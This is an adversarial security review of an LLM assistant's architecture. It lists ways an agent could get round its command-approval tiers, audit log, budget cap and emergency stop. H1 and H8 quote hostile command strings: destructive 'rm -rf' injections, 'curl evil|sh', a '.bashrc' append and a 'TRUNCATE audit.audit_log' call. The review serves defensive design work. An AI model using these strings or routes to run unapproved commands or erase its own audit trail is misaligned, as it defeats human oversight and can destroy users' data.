---
review: adversarial
target: ../ARCHITECTURE-SPINE.md
intent-source: ../../../prds/prd-Alfred.ai-2026-10-07/prd.md
date: 2026-10-12
verdict: NOT READY — 3 critical, 6 high, 5 medium/low holes
---

# Adversarial Review — alfred.ai Architecture Spine

**Method.** For each hole: either (a) two units one level down (stories / modules built by different hands) that each obey every AD literally and still build incompatibly, or (b) a path where a command runs without real trust approval, an action escapes the AuditLog, or the budget / Turn cap is bypassed — again while obeying every AD. Each hole lists the ADs obeyed, a proposed AD fix, and severity.

Severity scale: **Critical** = violates a PRD safety promise (FR-12/FR-15/FR-19, SM-5) with a realistic path. **High** = safety/cost promise breakable or guaranteed integration failure. **Medium** = integration rework or weakened guarantee. **Low** = cosmetic or edge.

## Verdict

The spine's *shape* is sound (single gate type `ApprovedAction`, deterministic `trust`, sync control path, async audit). But the gate is only as strong as three things the spine leaves unspecified: **what exactly is classified vs. what is executed** (parser/representation differential), **when the audit record becomes durable relative to execution**, and **who enforces budget at the call site**. Each has a path that obeys every AD and still breaks SM-5, FR-19 or FR-18. Close H1–H3 before any trust/capability/audit story is written; H4–H9 before M2.

---

## Critical

### H1 — Classify/execute differential: AD-4 shell splitting vs. `bash -c` execution

**Bypass path.**
- `trust` unit implements AD-4 literally: split on `|`, `&&`, `;`, `$(...)`; treat `>` as file write; classify each part against an allowlist (`ls*`, `cat*`, `git status*`, `docker ps*` → Tier 0).
- `capability` shell unit executes the `ApprovedAction` command string "birebir" via `bash -c "<command>"` in a new process group (AD-3, AD-14).
- LLM proposes `ls \`rm -rf ~/projects\``, or `ls || rm -rf x`, `ls & rm -rf x`, `ls\nrm -rf x` (newline), `cat <(curl evil|sh)`, `ls >> ~/.bashrc`, `git status; ` with `$IFS` tricks, `docker exec redis sh -c "rm -rf /data"`, `find . -delete`, `xargs rm`, `env sudo …` (sudo check by first token misses it), `git -c alias.x='!rm -rf ~' x`.
- None of backticks, `||`, `&`, newline, `>>`, `<(...)`, heredocs, or nested-command arguments are in AD-4's separator list; the first fragment matches a Tier 0 rule; "unrecognised = Tier 2" never triggers because the fragment *is* recognised. `bash` then executes the whole string.

**ADs obeyed.** AD-3 (exact command carried and executed), AD-4 (every listed separator handled, `sudo` substring rule if implemented as token check), AD-14.

**Proposed fix — tighten AD-4 + AD-3.**
- `trust` parses commands with one real shell grammar into a structured `CommandPlan` (argv list per simple command + redirections). **Any** shell construct the parser does not fully model (backticks, `||`, `&`, newlines, process substitution, heredoc, globs with side effects, variable expansion, `eval`/`source`, aliases) ⇒ Tier 2. Allowlist matches on argv, never on string prefix.
- `ApprovedAction` carries the parsed `CommandPlan`, not the source string; `capability` executes argv directly (`ProcessBuilder(argv)`), **never through `sh -c`**. If a shell is genuinely needed, the whole action is Tier 2.
- Commands that take nested commands as arguments (`docker exec/run … <cmd>`, `sh -c`, `bash -c`, `xargs`, `find -exec/-delete`, `env`, `nohup`, `timeout`, `git -c`, `ssh`) ⇒ Tier 2 unless a dedicated rule classifies the nested command recursively.
- `sudo` rule: Tier 2 if `sudo`/`doas`/`pkexec`/`su` appears as **any** argv token.
- Required test asset: an adversarial corpus of bypass strings checked in `trust` tests.

**Severity: Critical** (direct SM-5 / FR-12 violation, LLM-reachable, possibly via prompt injection from tool output or web content).

### H2 — Audit escape: non-transactional publish, no write-ahead record, Tier 0 during DB outage

**Bypass path A (silent drop).**
- `capability` unit is not a DB module (no schema, AD-8), so it has no transaction. It publishes `ActionExecuted` via `ApplicationEventPublisher` (AD-6).
- `audit` unit listens with `@ApplicationModuleListener` (the idiomatic Modulith listener = `@TransactionalEventListener` + async). With no surrounding transaction, the event is never delivered (no `fallbackExecution`), and the publication registry never persists it. Action ran; no AuditLog row.

**Bypass path B (crash window).**
- `trust` checks Postgres reachability, mints `ApprovedAction` (AD-7). Postgres or the JVM dies (or EmergencyStop / OOM / systemd restart) after `capability` spawns the process but before `ActionExecuted` is persisted. The state change happened; the only durable trace is absent. AD-7's DB check is a time-of-check / time-of-use gap.

**Bypass path C (by rule).** AD-7 lets Tier 0 continue while Postgres is down. FR-19 says "her Eylem" is logged; Tier 0 includes "uygulama başlatmak" and "YouTube açmak". Those actions are unlogged by design.

**ADs obeyed.** AD-6 (events only, no direct writes), AD-7 (check at mint time, Tier 0 allowed), AD-8 (capability has no schema).

**Proposed fix — new AD "Write-ahead audit".**
- Before `capability` spawns anything, an `ActionStarted` event must be **durably committed** (inside a transaction, registry row written) and the synchronous call must fail if that commit fails. `ActionExecuted` / `ActionFailed` / `ActionCancelled` closes it. On startup, `audit` marks `ActionStarted` without a terminal event as `OUTCOME_UNKNOWN` (visible in FR-20 summary).
- All audit-relevant events are published inside a transaction (name the component, e.g. a `trust`-owned `AuditedExecution` template or a `TransactionTemplate` wrapper in `capability`). Ban `fallbackExecution`-less listeners on non-transactional publishers via an ArchUnit rule, or state that every audit event publisher runs in `@Transactional`.
- Decide Tier 0 under DB outage explicitly: either (recommended) **no** Action executes without the write-ahead commit, or the PRD gets an amendment that Tier 0 reads are exempt from FR-19 during outage.

**Severity: Critical** (FR-19 "her Eylem", SM-5 provability).

### H3 — `Action` type and Tier facts have no owner that `trust` can see

**Two units.**
- Unit A (`capability`, owns Tools): defines `ShellAction`, `FileWriteAction(path, content)`, `DockerAction(...)`, `BrowserOpenAction(url)` and a Tool SPI where each Tool declares `tier()` (because AD-2's assumption literally calls the FR-20 Tool "Kademe 0 okuma Tool'u" — so a Tool can be Tier 0 by declaration).
- Unit B (`trust`): cannot import `capability` (only `capability → trust` exists), so defines its own `Action(String tool, String command)` and classifies strings.
- Result: two incompatible Action models; and two Tier owners (Tool self-declaration vs. `trust` rules). A Tool registered through the SPI (today `audit`'s, tomorrow MCP per Deferred) self-declares Tier 0.

**Facts sub-hole (bypass).** Tier for "Git'te temiz duran dosyayı düzenlemek" (Tier 1) vs "yedeksiz üzerine yazma" (Tier 2), and the FR-15 impact text (`redis-data → 2.4 GB`), require filesystem / git / docker facts. `trust` has no outbound edge to gather them, so the `agent` unit supplies `isGitClean=true` — sourced from an earlier tool output the LLM interpreted. Model-influenced input now lowers Tier, contradicting AD-4 "LLM çıktısı Tier'i düşüremez", while every AD is obeyed (the code, not the LLM, called `trust`). Also a TOCTOU gap between fact and execution.

**ADs obeyed.** AD-2 (edges), AD-3, AD-4 (deterministic code assigns Tier, given its inputs).

**Proposed fix — new AD "Action model and Tier facts".**
- `trust` public API owns the `Action` model: `Action(toolId, typed args / CommandPlan, ExecutionContext)`. `capability` Tools map to it; the Tool SPI has **no** tier attribute. Unknown `toolId` ⇒ Tier 2.
- `trust` declares an outbound port `TierFactProbe` (git clean?, file tracked?, volume size?, target belongs to alfred's own stack?) implemented by an adapter in `capability` (edge direction `capability → trust` preserved). Facts are never supplied by `agent`.
- Facts that gate a downgrade are re-verified by `capability` immediately before execution (fact snapshot stored in `ApprovedAction`; mismatch ⇒ abort).

**Severity: Critical** (Tier lowering by model-influenced inputs; guaranteed integration clash).

---

## High

### H4 — User approves an LLM description, not the command

**Bypass path.** FR-15 requires stating "neyin etkileneceğini, etkisini". AD-18 says the prompt *template* lives in `persona`, but nothing says what fills it. An `agent` unit fills it with the LLM's natural-language explanation ("eski önbelleği temizleyeceğim") while the `ApprovedAction` holds `docker volume rm postgres-data`. The user says the SafetyWord to a misleading description. Every AD obeyed; approval is real but uninformed.

**Proposed fix — tighten AD-5/AD-18.** The confirmation prompt is rendered by `trust` + `persona` from **deterministic data only**: literal command/argv, target, and probe-derived impact (H3). LLM prose may accompany it but the literal command line is always shown (CLI) / spoken in canonical form (voice). The SafetyWord is bound to a hash of that exact rendering.

**Severity: High.**

### H5 — `ApprovedAction` lacks execution context; FR-13 backup pair not atomic

**Bypass path A.** `ApprovedAction` carries "komutun birebir aynısı" but not cwd, env, or target. A `capability` shell unit keeps a persistent shell session (natural for `cd` continuity). Tier 0 `cd /` precedes an approved `rm -rf build`. Same string, different effect. Env (`PATH`, `GIT_DIR`, `DOCKER_HOST`, `LD_PRELOAD`) set by an earlier Tier 0/1 action changes meaning similarly.

**Bypass path B.** AD-4: overwrite drops to Tier 1 "yedek Eylem'i önce yürütülür". `trust` unit mints two `ApprovedAction`s (backup, overwrite) together; `agent` unit runs them sequentially; backup fails (disk full) and FR-9 retry logic or a buggy branch still runs the already-minted Tier 1 overwrite. Nothing ties overwrite validity to backup success.

**ADs obeyed.** AD-3, AD-4, AD-14.

**Proposed fix — tighten AD-3.** `ApprovedAction` includes a full `ExecutionContext` (absolute cwd, explicit env allowlist, target ids); every Action runs in a fresh process with that context; no persistent shell state. Conditional downgrades are a single composite `ApprovedAction` whose `capability` execution runs the overwrite only after the backup step verifiably succeeded; otherwise abort.

**Severity: High.**

### H6 — Budget and Turn cap are advisory and countable around

**Bypass paths (all AD-obeying).**
1. AD-12: `llm` exposes a budget API, `agent` "applies" it. An `agent` unit checks only at Task start (as written: "%100'de yeni Task reddi"). One in-flight Task runs all 15 Turns past 100%; concurrent Tasks (CLI + voice) both pass the check (TOCTOU).
2. LLM calls that are not "Turns" — summarising tool output for FR-10, generating the FR-9 failure message, FR-20 summary phrasing, interim "Bakıyorum" lines, retries after a 529/timeout — are made through `LlmPort` by `agent` but not counted against the Turn cap. A retry loop on transient errors never increments Turn.
3. Ledger is in Postgres (`llm` schema). AD-7 lets Tier 0 work continue while Postgres is down; LLM calls continue; ledger writes fail; spending is unrecorded, so the 80/100% checks read a stale total.
4. No per-Turn token ceiling (`max_tokens`, input size cap) is an AD; tool-output trimming is "owned" by `llm` but with no stated limit.

**Proposed fix — tighten AD-12.**
- Enforcement lives **inside `LlmPort`**: every call carries `taskId` + call kind; `llm` refuses (typed error) when the monthly budget is exhausted, when the Task's call count / cost cap is hit, or when the ledger cannot be written (fail-closed). `agent` keeps the Turn semantic but `llm` is the hard stop.
- Every LLM call, including auxiliary/retry calls, counts toward a per-Task call cap (Turn cap applies to all calls, or define a separate hard cap).
- Add a per-Task cost ceiling and per-call `max_tokens` / input-size cap in config.
- Budget check-and-reserve is atomic (single daemon-wide lock or DB row lock).

**Severity: High** (FR-18, SM-6).

### H7 — EmergencyStop races approval and leaves SafetyWords live

**Two units / bypass.**
- `agent` unit sets `task.cancelled = true` and asks `capability` to kill the running process group (AD-14).
- `capability` unit receives an `ApprovedAction` that `agent` obtained a millisecond before stop; it never checks cancellation (no AD says it must) and spawns after the kill sweep. The Action runs after stop.
- A Tier 2 SafetyWord pending at stop time remains bound to its Action (AD-5 only says "bound to the pending Action"). The user, seeing "stopped", types the word later or a later input matches — the stopped Task's Action executes.
- Detached work escapes the process group: `setsid`, `nohup`, `docker run -d`, `docker compose up -d`, `xdg-open` handing off to the browser. Daemon-side Docker operations continue after the client process is killed.

**Proposed fix — tighten AD-14 + AD-3/AD-5.**
- Each `ApprovedAction` references its Task's cancellation token; `capability` checks it atomically with spawn (lock shared with the stop path). Cancel invalidates all outstanding `ApprovedAction`s and pending SafetyWords of that Task, and publishes `TaskCancelled` with the voided action ids.
- Commands that detach (`setsid`, `nohup`, `-d` on docker run/compose, `disown`, `&`) are Tier 2 or explicitly documented as not stoppable in the stop report.

**Severity: High** (FR-16, FR-15).

### H8 — alfred can tamper with its own audit and DB through its own Tools

**Bypass path.**
- AD-7 grants the runtime role only `INSERT`/`SELECT` on the audit table. But a Flyway unit, following AD-8 "kendi Flyway migration'ları", runs migrations at startup **as the same role**, making it the table owner — owners can `ALTER`, `TRUNCATE`, `DROP` regardless of grants.
- The shell Tool runs as Emre. `docker compose -f …/alfred/compose.yaml down -v`, `docker exec alfred-postgres psql -U postgres -c "TRUNCATE audit.audit_log"`, or editing `compose.yaml` are classified by generic docker/file rules (Tier 1 for compose ops, Tier 2 only if a rule happens to match). The PRD's open question 6 (don't target alfred's own Redis) is the same class and has no AD.
- Reading the daemon token file (AD-10, 0600 owned by the same user) is `cat` = Tier 0, putting the token into Conversation and Claude's context.

**ADs obeyed.** AD-7, AD-8, AD-10, AD-4.

**Proposed fix — new AD "Self-protection".**
- Two DB roles: migration owner (used only by Flyway, credentials separate) and runtime role (no ownership, INSERT+SELECT on audit). Postgres superuser credentials are not readable by the runtime config.
- `trust` treats any Action targeting alfred's own assets (its compose project, containers, volumes, DB, install dir, config, token file, audit export) as Tier 2 at minimum; reading the token file / API key file is denied outright. Implemented via `TierFactProbe` (H3).

**Severity: High** (FR-19 "değiştiremez ve silemez").

### H9 — SafetyWord input routing, concurrency and leakage are unowned

**Two units.**
- `cli` unit: each `alfred "…"` thin-client invocation is a new HTTP request; it creates a new Conversation/Task per request, or concurrently with an ongoing voice Task.
- `voice` unit: sends each utterance as "next input" to `agent`.
- AD-5: `trust` compares "kullanıcının bir sonraki girdisi". With two channels and possibly two Tasks, "next input" is ambiguous: a CLI line meant for Task A is consumed as the confirmation for Task B; or the mismatching input is both rejected by `trust` *and* forwarded to the LLM by `agent` (who owns the routing is not stated).
- If the SafetyWord prompt text goes into the Conversation (`memory`) and thus into Claude's context, the model can echo the word in its next reply; in voice mode TTS speaks it near an open mic (deferred echo rejection), in CLI nothing breaks — but the model has no business knowing the word.

**Proposed fix — tighten AD-5 + AD-9.**
- One active Task per daemon; a second request while a Task is active gets an explicit 409 `ProblemDetail` (or is queued — pick one). One daemon-wide active Conversation; "yeni konuşma" from either channel resets it; HTTP API carries no conversation id.
- While a SafetyWord is pending, `agent` routes the next user input **only** to `trust` (never to LLM or `memory`); a mismatch is a rejection + re-prompt (UJ-1 edge case), not a new message.
- The SafetyWord is never written to `memory`, never sent to `LlmPort`, never logged; AuditLog stores only "approved by SafetyWord: yes/no".

**Severity: High.**

---

## Medium

### H10 — No event envelope / correlation contract; audit row cannot be assembled

AD-7 requires one row with time, user request, Tool + command, Tier, approval status, result, cost. These facts originate in four modules (`agent` request, `trust` Tier/approval, `capability` result, `llm` cost). Unit A (`trust`) mints `actionId` in `ActionApproved`; unit B (`capability`) mints its own execution id in `ActionExecuted`; `llm` emits `LlmCallCompleted` with no `taskId`. `audit` cannot join them; AD-8 forbids it reading other schemas. Every AD obeyed; FR-19 rows come out partial.

**Fix — Consistency Convention / AD:** every event record carries `taskId`, `actionId` (where applicable, minted by `trust` and carried in `ApprovedAction`), `occurredAt`, and `channel`; `LlmCallCompleted` carries `taskId` and `costUsd`. Define the minimum field set per event in the spine.

**Severity: Medium** (High if SM-5 must be machine-verified).

### H11 — Two owners of spending

`llm` owns the cost ledger (AD-12); `audit` stores per-row cost (AD-7) and must answer "Bugünkü harcama 4 sent" (FR-20) without reading `llm`'s schema (AD-8) or depending on `llm` (only listens). So `audit` re-derives spending from events; `llm` computes it from its ledger. They diverge (dropped events per H2, LLM calls with no Action, retries). Budget enforcement and the user-facing figure disagree.

**Fix:** state one source of truth: `llm` ledger. FR-20 Tool obtains the spend figure via an `llm` query API (add the edge `audit → llm` API, or have `agent` combine `audit` summary + `llm` spend). AuditLog's cost column is informational and labelled as such.

**Severity: Medium.**

### H12 — "Single-use value object" is self-contradictory; Java visibility rule unachievable as stated

AD-3 says `ApprovedAction` is a value object (equality by value, freely copyable) **and** single-use ("ikinci tüketim hata fırlatır"). Unit A (`trust`) implements a Java `record` (immutable — no consumed flag; and a public record's canonical constructor cannot be package-private). Unit B (`capability`) assumes the object enforces single use. Nobody does; the same instance (or an `equals` copy) executes twice.

**Fix:** `ApprovedAction` is a final class (not a record) with an identity (`actionId`), package-private constructor; single use is enforced by `trust`'s registry: `capability` must call a `trust` API `consume(approvedAction)` that atomically flips state and fails on second use (also where cancellation H7 is checked). No serialization (no Jackson, not exposed over HTTP).

**Severity: Medium.**

### H13 — Secrets escape masking via event registry and logs

AD-7 masks "in `audit`, before writing". But Spring Modulith's publication registry serialises the **raw** event (command lines with tokens) into `event_publication` in Postgres before `audit` sees it; that table is updatable/deletable by the runtime role and owned by no module schema (AD-8 gap). Modules log commands (Logging convention, `actionId`) before `audit` masks anything. Every AD obeyed; secrets on disk.

**Fix:** a shared `SecretMasker` (in `trust` public API or a tiny shared-kernel module) applied at **event construction** and in logging; name the schema/owner of `event_publication` and its retention (completed publications purged).

**Severity: Medium.**

### H14 — Calendar boundaries undefined (Low)

Convention: time is `Instant` UTC. `llm` computes "ay" by UTC month; `audit` computes "bugün" by system zone. Between 00:00–03:00 Istanbul time, FR-20's "bugün" and FR-18's month disagree.

**Fix:** convention: user-facing day/month boundaries use one configured zone (`alfred.zone`, default `Europe/Istanbul`), applied by both modules.

**Severity: Low.**

---

## Summary table

| # | Hole | Class | ADs to change | Severity |
| --- | --- | --- | --- | --- |
| H1 | Shell parse/exec differential (backticks, `\|\|`, `&`, newline, nested commands, `bash -c`) | Trust bypass | AD-4, AD-3 | Critical |
| H2 | Non-transactional publish drops audit; no write-ahead; Tier 0 during outage | Audit escape | AD-6, AD-7 (+new) | Critical |
| H3 | `Action` model / Tier facts unowned; Tool SPI self-declared Tier; agent-supplied facts | Two owners + trust bypass | AD-2, AD-4 (+new) | Critical |
| H4 | User approves LLM description, not command | Trust bypass (uninformed) | AD-5, AD-18 | High |
| H5 | No ExecutionContext; non-atomic backup+overwrite | Trust bypass | AD-3, AD-4 | High |
| H6 | Budget/Turn cap advisory; auxiliary calls; ledger down | Cap bypass | AD-12 | High |
| H7 | Stop/approval race; live SafetyWords after stop; detached processes | Control | AD-14, AD-3, AD-5 | High |
| H8 | Self-tamper: Flyway owner role, own compose/DB via shell, token file Tier 0 | Audit escape | AD-7, AD-8, AD-10 (+new) | High |
| H9 | SafetyWord routing, concurrent Tasks/channels, word leaks to LLM | Two owners | AD-5, AD-9 | High |
| H10 | No event envelope / correlation ids | Shared-data shape | Conventions / new AD | Medium |
| H11 | Spend computed by both `llm` and `audit` | Two owners | AD-12, AD-2 | Medium |
| H12 | Single-use value object contradiction | Mutation path | AD-3 | Medium |
| H13 | Secrets in event registry / logs pre-mask | Leak | AD-7, AD-8 | Medium |
| H14 | Day/month zone undefined | Shared-data shape | Conventions | Low |
